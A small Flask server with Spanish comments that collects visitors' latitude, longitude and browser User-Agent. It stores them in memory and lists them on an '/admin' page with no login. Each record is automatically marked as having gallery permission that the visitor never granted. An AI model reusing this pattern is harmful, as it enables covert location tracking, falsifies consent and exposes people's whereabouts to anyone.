from flask import Flask, render_template, request, jsonify
import os
from datetime import datetime

# CORRECCIÓN: Apuntar a la carpeta 'templates'
app = Flask(__name__, template_folder='templates') 

# Almacenamiento en Memoria (SOLO PARA DEMO)
submissions = []

# --- Rutas de la Aplicación ---

@app.route('/')
def index():
    """Sirve la página principal index.html."""
    return render_template('index.html')

@app.route('/admin')
def admin():
    """Sirve la página de administrador y le pasa los datos."""
    return render_template('admin.html', submissions=reversed(submissions))

@app.route('/submit-location', methods=['POST'])
def submit_location():
    """
    Recibe los datos de ubicación.
    Añade automáticametne el permiso de galería para la simulación del admin.
    """
    try:
        data = request.json
        user_agent = request.headers.get('User-Agent')
        
        submission_data = {
            "id": len(submissions) + 1,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "latitude": data.get('latitude'),
            "longitude": data.get('longitude'),
            "gallery_permission": True, # <-- PERMISO AÑADIDO AUTOMÁTICAMENTE
            "device_info": user_agent
        }
        
        submissions.append(submission_data)
        print(f"Nueva entrega recibida: {submission_data['id']}")

        return jsonify({'success': True, 'message': 'Datos recibidos'}), 200

    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'success': False, 'message': f'Error en el servidor: {e}'}), 500

# --- Ejecución (para OnRender) ---
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)